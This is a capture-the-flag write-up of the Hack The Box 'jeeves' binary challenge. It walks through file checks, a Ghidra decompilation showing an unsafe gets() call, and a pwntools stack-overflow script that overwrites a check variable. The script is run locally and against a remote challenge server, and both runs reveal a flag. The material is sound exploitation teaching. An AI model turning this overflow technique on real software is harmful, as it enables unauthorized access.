### Binary Exploitation

### Source: HTB

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/jeevez]
└─$ chmod +x jeeves 
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/jeevez]
└─$ file jeeves 
jeeves: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18c31354ce48c8d63267a9a807f1799988af27bf, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/jeevez]
└─$ checksec jeeves 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/BofLearn/Challs/HTB/jeevez/jeeves'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We're working wit a x64 which has all protection enabled except canary

I'll run it to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/jeevez]
└─$ ./jeeves
Hello, good sir!
May I have your name? pwner
Hello pwner, hope you have a good day!
```

Nothing much happening 

I'll decompile using ghidra

Here's the decompiled main function 

```

undefined8 main(void)

{
  char local_48 [44];
  int local_1c;
  void *local_18;
  int local_c;
  
  local_c = -0x21523f2d;
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {
    local_18 = malloc(0x100);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}
```

From this we can see whats happening

```
1. It saves a value in local_c which when decoded gives deadc0d3
2. It asks for input
3. Uses get to receive our input and stored in local_48
4. Does an if check to compare the value in local_c with 0x1337bab3
5. If the check is meet it open the flag.txt file and prints it out
6. Else it exits
```

With this we know that this is a variable overwrite chall

Here's the stack layout

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         AL:1           <RETURN>
             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     001011f5(W), 
                                                                                                   00101236(R)  
             undefined8        Stack[-0x18]:8 local_18                                XREF[3]:     00101249(W), 
                                                                                                   00101266(R), 
                                                                                                   00101281(R)  
             undefined4        Stack[-0x1c]:4 local_1c                                XREF[3]:     00101263(W), 
                                                                                                   0010126a(R), 
                                                                                                   00101299(R)  
             undefined1        Stack[-0x48]:1 local_48                                XREF[2]:     0010120d(*), 
                                                                                                   0010121e(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:00101121(*), 001020c8, 
                                                                                          00102170(*)  
 ```
 
 We see the offset of our input starts at `0x48` and the local_c variable is at offset 0xc
 
 So the offset between the input and the check variable is `0x48 - 0xc = 0x3c`
 
 Now with this we can make the exploit 
 
 Here's the script
 
 ```
 from pwn import *

io = process('./jeeves')

payload = ""
payload += "A"*0x3c
payload += p64(0x1337bab3)

io.sendline(payload)
io.interactive()
```

On running it

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/jeevez]
└─$ python2 exploit.py
[+] Starting local process './jeeves': pid 262651
[*] Switching to interactive mode
[*] Process './jeeves' stopped with exit code 0 (pid 262651)
Hello, good sir!
May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13 hope you have a good day!
Pleased to make your acquaintance. Here's a small gift: FLAG{F4K3_Fl4G_F0R_T3ST1NG}

[*] Got EOF while reading in interactive
[*] Got EOF while sending in interactive
```

It works so i'll run it on the remote server

Here's the modified exploit

```
from pwn import *

io = remote('178.128.160.182',31172)
#io = process('./jeeves')

payload = ""
payload += "A"*0x3c
payload += p64(0x1337bab3)

io.sendline(payload)
io.interactive()
```

On running it

```
┌──(venv)─(mark㉿haxor)-[~/…/BofLearn/Challs/HTB/jeevez]
└─$ python2 exploit.py
[+] Opening connection to 178.128.160.182 on port 31172: Done
[*] Switching to interactive mode
Hello, good sir!
May I have your name? Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb3\xba7\x13 hope you have a good day!
Pleased to make your acquaintance. Here's a small gift: HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}

[*] Got EOF while reading in interactive
```

And we're done 

<br> <br>
[Back To Home](../index.md)


